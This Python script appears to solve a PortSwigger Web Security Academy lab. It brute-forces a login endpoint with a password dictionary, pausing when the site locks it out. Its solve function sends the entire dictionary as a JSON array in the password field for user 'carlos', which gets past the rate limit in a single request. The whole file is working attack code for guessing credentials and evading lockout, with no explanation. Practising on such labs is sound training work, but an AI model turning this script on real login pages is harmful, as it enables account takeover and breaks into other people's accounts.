import requests
import time
import json

DOMAIN = "0a54006503a0c212804d8575004c00de.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/login",
    "Content-Type": "application/json",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Cookie": "session=u5HdIb8p1FW8ktqVuxdNJ0XqlSo2JDkB",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

PASSWORDS_DIC = []

with open("../passwords.dic", "r") as f:
    for line in f:
        PASSWORDS_DIC.append(line.strip())

def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, json=data)

    if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in response.text:
        print(f"WARNING: Too many incorrect login attempts for {username}")

    
    return response

def brute_force_password(username):
    for password in PASSWORDS_DIC:
        password = password.strip()
        response = login(username, password)

        print(f"Trying: {username}:{password}")
        
        if "Invalid username or password." not in response.text and "You have made too many incorrect login attempts. Please try again in 1 minute(s)." not in response.text:
            print(f"SUCCESS: {username}:{password}")
        
        if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in response.text:
            print(f"Sleeping for 60 seconds")
            time.sleep(60)

def gen_payload():
    payload = {
        "username": "carlos",
        "password": PASSWORDS_DIC
    }

    return json.dumps(payload)

def solve():

    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=gen_payload())

    if "Invalid username or password." in response.text:
        print("Invalid username or password.")
    else:
        print(response.text)
            

solve()